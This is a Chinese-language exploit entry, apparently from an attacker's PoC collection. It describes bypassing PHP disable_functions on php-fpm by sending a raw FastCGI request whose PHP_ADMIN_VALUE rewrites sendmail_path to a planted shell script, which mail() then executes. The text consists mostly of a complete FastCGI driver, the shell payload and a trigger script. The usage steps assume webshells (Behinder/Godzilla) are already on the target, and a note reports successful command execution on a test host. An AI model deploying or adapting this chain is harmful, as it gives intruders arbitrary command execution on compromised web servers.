# php-fpm FastCGI sendmail_path 劫持 → 绕过 disable_functions 拿命令执行（mail() 的 C 层 popen）

- **code**: php-fpm-fastcgi-sendmail_path-劫持-绕过-disable_functions-拿命令执行-mail-的-c-层-popen
- **kind**: exp
- **category**: privesc
- **component**: php-fpm / PHP 5.6 / mail() / disable_functions
- **severity**: high
- **language**: php
- **source**: self
- **verified**: 1
- **verified_note**: 2026-10-13 在 203.0.113.101（CentOS 7.5 / PHP 5.6.40 / 宝塔）实测：ini_get('sendmail_path') 回显 [/tmp/n_sm.sh]，mail() 返回 true，/tmp/n_sm_out.txt 收到 uid=1000(www) gid=1000(www) groups=1000(www)、uname -a 3.10.0-862.6.3.el7.x86_64、CentOS Linux release 7.5.1804。同环境下 exec/system/shell_exec/passthru/popen/proc_open/pcntl_exec 的 function_exists 全为 0。
- **path**: pocs/php-fpm-fastcgi-sendmail_path-劫持-绕过-disable_functions-拿命令执行-mail-的-c-层-popen/fcgi_sendmail_path_rce.php
- **tags**: php-fpm,fastcgi,disable_functions,mail,sendmail_path,rce,linux
- **created_at**: 2026-10-13T13:54:35.102Z
- **found_by**: exploit

## 描述

当目标禁用 exec/system/shell_exec/passthru/popen/proc_open/pcntl_exec（MINIT 已摘除函数表）但保留了 mail() 时，用 FastCGI 参数 PHP_ADMIN_VALUE 把 PHP_INI_SYSTEM 的 sendmail_path 改写成我方 shell 脚本，mail() 内部走 C 层 popen 执行该脚本 ⇒ 拿到 web 用户任意命令执行。前提：能向 php-fpm 的 unix socket 直接发 FastCGI 请求（通常配合 fastcgi 沙箱逃逸 / open_basedir 归零）。

## 用法

```
1) 用冰蝎/哥斯拉马把 payload 与 driver 推到 /tmp；2) `python fcgi_run.py --shell <id> --file n_sm1.php --name nsm1`（driver 换成 f_fcgi_drv3.php，并把 __SMPATH__ 换成 /tmp/n_sm.sh）；3) 读回 /tmp/n_sm_out.txt 验证 uid；4) 之后所有命令改成写 /tmp/n_sm.sh 再 mail() 触发即可。换目标只需改 SOCK（glob /tmp/php-cgi-*.sock、/tmp/php-cgi-<ver>.sock、/run/php-fpm.sock、127.0.0.1:9000）与 sendmail_path 路径。
```

## 正文

```
<?php
// f_fcgi_drv3.php —— FastCGI 驱动：open_basedir 归零 + 劫持 sendmail_path
function fcgi_nv($n, $v) {
    $r = ""; $ln = strlen($n); $lv = strlen($v);
    if ($ln < 128) { $r .= chr($ln); } else { $r .= chr(($ln >> 24) & 0xFF) . chr(($ln >> 16) & 0xFF) . chr(($ln >> 8) & 0xFF) . chr($ln & 0xFF); }
    if ($lv < 128) { $r .= chr($lv); } else { $r .= chr(($lv >> 24) & 0xFF) . chr(($lv >> 16) & 0xFF) . chr(($lv >> 8) & 0xFF) . chr($lv & 0xFF); }
    return $r . $n . $v;
}
function fcgi_h($t, $c) {
    $len = strlen($c); $pad = (8 - ($len % 8)) % 8;
    return chr(1) . chr($t) . chr(0) . chr(1) . chr(($len >> 8) & 0xFF) . chr($len & 0xFF) . chr($pad) . chr(0) . $c . str_repeat(chr(0), $pad);
}
$SOCK = "/tmp/example.com";   // 用 glob('/tmp/php-cgi-*.sock') 枚举
$SCR  = "<?php echo 'hit';";       // 先落盘到 /tmp/<name>.php
$P = array(
  "GATEWAY_INTERFACE"=>"FastCGI/1.0", "REQUEST_METHOD"=>"GET",
  "SCRIPT_FILENAME"=>$SCR, "SCRIPT_NAME"=>"/".basename($SCR), "QUERY_STRING"=>"",
  "REQUEST_URI"=>"/".basename($SCR), "DOCUMENT_ROOT"=>"/tmp",
  "SERVER_PROTOCOL"=>"HTTP/1.0", "REMOTE_ADDR"=>"127.0.0.1", "SERVER_NAME"=>"localhost",
  "SERVER_SOFTWARE"=>"nginx", "CONTENT_LENGTH"=>"0",
  // 关键三行：open_basedir 归零（PHP_INI_ALL，可改）；disable_functions 置空（改不动函数表，但会让 ini_get 读空）；
  // sendmail_path 指向我方脚本（PHP_INI_SYSTEM，实测 php-fpm 在 STAGE_ACTIVATE 阶段可被 FastCGI 参数改写）
  "PHP_ADMIN_VALUE" => "open_basedir=/\ndisable_functions=\nsendmail_path=/tmp/n_sm.sh\n",
  "PHP_VALUE"       => "open_basedir=/\ndisable_functions=\nsendmail_path=/tmp/n_sm.sh\n",
);
$s = @fsockopen("unix://".$SOCK, -1, $e1, $e2, 5);
@fwrite($s, fcgi_h(1, chr(0).chr(1).chr(0).str_repeat(chr(0),5)));
$blob = ""; foreach ($P as $k=>$v) { $blob .= fcgi_nv($k,$v); }
@fwrite($s, fcgi_h(4,$blob)); @fwrite($s, fcgi_h(4,"")); @fwrite($s, fcgi_h(5,""));
while (!feof($s)) { read_frames($s, $out); }
function read_frames($s, &$out) {
  $h = @fread($s,8); if (strlen($h)<8) return; $t=ord($h[1]);
  $len=(ord($h[4])<<8)+ord($h[5]); $pad=ord($h[6]); $c=""; $need=$len;
  while ($need>0) { $b=@fread($s,$need); if($b===false||$b==="")break; $c.=$b; $need-=strlen($b); }
  if ($pad>0) @fread($s,$pad);
  if ($t==6) $out .= $c; elseif ($t==3) return;
}
echo $out;
?>

--- /tmp/n_sm.sh（sendmail_path 指向的脚本，PHP 会 popen("/tmp/n_sm.sh -t -i") 并忽略 stdin）---
#!/bin/sh
OUT=/tmp/n_sm_out.txt
exec > $OUT 2>&1
id; whoami; uname -a; ps -ef; netstat -lntp
# 任意命令都写这里，输出落到 $OUT，再用冰蝎马/文件读取取回
exit 0

--- 触发脚本 n_sm1.php（先落 /tmp/n_sm.sh，再让 mail() 引爆）---
<?php
error_reporting(0);
file_put_contents('/tmp/n_sm.sh', "#!/bin/sh\nOUT=/tmp/n_sm_out.txt\nexec > \$OUT 2>&1\nid\nuname -a\nexit 0\n");
chmod('/tmp/n_sm.sh', 0777);
echo "sendmail_path=[".ini_get('sendmail_path')."]\n";      // 必须回显 /tmp/n_sm.sh，否则注入没生效
@mail('user@example.com','x','x','From: user@example.com');
usleep(400000);
echo file_get_contents('/tmp/n_sm_out.txt');

--- 关键坑 ---
1) 第 5 个参数（additional_parameters）注入 sendmail 命令行**被 PHP 5.6 拒绝**（mail() 直接返回 false），实测 `-C/x;id>/tmp/x;#` 无效 ⇒ 必须改 sendmail_path 本身。
2) `disable_functions` 置空**不会**恢复函数：MINIT 阶段已从函数表摘除；判据用 function_exists()，不要信 ini_get('disable_functions') 读到空。
3) sendmail_path 不生效时先确认返回的是不是 /tmp/n_sm.sh；再确认 popen 走的脚本有 shebang 且 chmod 0777。
4) 冰蝎马 payload 里禁止出现裸竖线 `|`（会被 explode('|') 截断），脚本里的管道请用临时文件+重定向替代。
```
